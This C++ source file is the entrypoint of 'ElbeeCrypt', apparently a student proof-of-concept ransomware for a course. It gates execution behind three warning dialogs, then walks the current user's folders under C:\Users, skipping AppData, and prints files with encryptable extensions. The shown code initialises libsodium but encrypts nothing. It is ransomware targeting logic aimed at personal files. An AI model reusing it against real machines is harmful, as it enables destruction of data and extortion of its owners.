#include <filesystem>
#include <iostream>
#include <string>
#include <vector>
#include "elbeecrypt/cryptor/main.hpp"

#include <sodium.h>

#include "elbeecrypt/common/io/direntwalk.hpp"
#include "elbeecrypt/common/targets/extensions.hpp"
#include "elbeecrypt/common/utils/string.hpp"

//Platform-specific includes
#if defined(_WIN32) || defined(__WIN32__) || defined(WIN32)
	//Definitions
	#define WINDOWS_PLATFORM
	#define WIN32_LEAN_AND_MEAN
	#include <windows.h>
#else
	#error "This code is only meant to be compiled for Windows targets. Either cross-compile or build natively on Win-32."
#endif

//Configuration
#define SAFETY_NET true //Whether there should be a warning before running
#define SPAM_RANSOM_NOTES false //Whether there should be ransom notes dropped in every directory that the ransomware hit

using namespace elbeecrypt;
using namespace std;

/** 
 * Main entrypoint for ElbeeCrypt's cryptor binary. 
 * 
 * @param argc The number of arguments
 * @param argv The arguments themselves
 * @return The status code on conclusion of execution
 */
int main(int argc, char **argv){
	//Deploy the safety net before continuing
	#if SAFETY_NET == true
		if(!cryptor::Main::safetyNet()) exit(-1);
	#endif

	cout << "Encryption routines started!" << endl;

	std::cout << "Sodium: " << sodium_init() << std::endl;

	//Define the lambda to collect the directory listings
	auto fileConsumer = [](const fs::path& path){
		if(common::targets::Extensions::isEncryptable(path)){
			std::cout << "Found encryptable file at " << path << std::endl;
		}
	};

	auto folderConsumer = [](const fs::path& path){
		//Skip "." directories and AppData (skipping straight to the juicy stuff)
		if(path.filename().string()[0] == '.') return false;
		if(common::utils::String::toLowercase(path.filename().string()) == "appdata") return false;
		return true;
	};

	//Call the walk function with the root path and the lambda
	std::string uname(getenv("username"));
	common::io::DirentWalk::walk(fs::path("C:\\Users\\" + uname), fileConsumer, folderConsumer);

	vector<fs::path> paths = {};

	common::io::DirentWalk::directoryList("C:\\Users\\", paths);

	cout << paths[0] << endl;

	for(fs::path path : paths){
		if(common::targets::Extensions::isEncryptable(path)){
			std::cout << "Found encryptable file at " << path << std::endl;
		}
	}
}

/** Impl of safetyNet(). */
bool cryptor::Main::safetyNet(){
	//First prompt with info about the program
	int promptOne = MessageBox(
		NULL,
		"Welcome to ElbeeCrypt: A PoC file-encrypting ransomware for CECS-378. \n\nMade by Josh, Jaxon, Valeria, Nathanael, David, Alvin, and Robin \n\nWARNING: This is a live file encrypting ransomware. While this sample doesn't destroy encryption keys like other ransomware, things can go haywire if the keys are lost or damaged or you delete the encrypted files. We are not responsible for any damage to your files or system. DO NOT PROCEED UNLESS YOU ARE OKAY WITH PERMANENT DAMAGE TO YOUR FILES. \n\nIf you are okay to proceed, press the \"OK\" button.",
		"ElbeeCrypt",
		MB_ICONASTERISK | MB_OKCANCEL | MB_DEFBUTTON2
	);
	if(promptOne == IDCANCEL) return false; //Gate one

	//Second prompt with further warning
	int promptTwo = MessageBox(
		NULL,
		"This ransomware sample, like other ransomware, CAN DESTROY YOUR PERSONAL FILES PERMANENTLY. Unless configured otherwise, this sample will recursively hunt out EVERY TARGET file in \"C:\\Users\\\", meaning any file in that directory that matches the target extension list WILL BE ENCRYPTED! \n\nIf you are okay to proceed, press the \"OK\" button.",
		"ElbeeCrypt",
		MB_ICONWARNING | MB_OKCANCEL | MB_DEFBUTTON2
	);
	if(promptTwo == IDCANCEL) return false; //Gate two

	//Third prompt with a final warning
	int promptThree = MessageBox(
		NULL,
		"LAST WARNING: THIS SAMPLE CAN DESTROY YOUR FILES!!!!!! As stated previously THE AUTHORS HOLD NO RESPONSIBILITY IF THIS OCCURS. \n\nIf you are okay to proceed, press the \"OK\" button.",
		"ElbeeCrypt",
		MB_ICONERROR | MB_OKCANCEL | MB_DEFBUTTON2
	);
	if(promptThree == IDCANCEL) return false; //Gate three

	//No cancellations, so return true be default
	return true;
}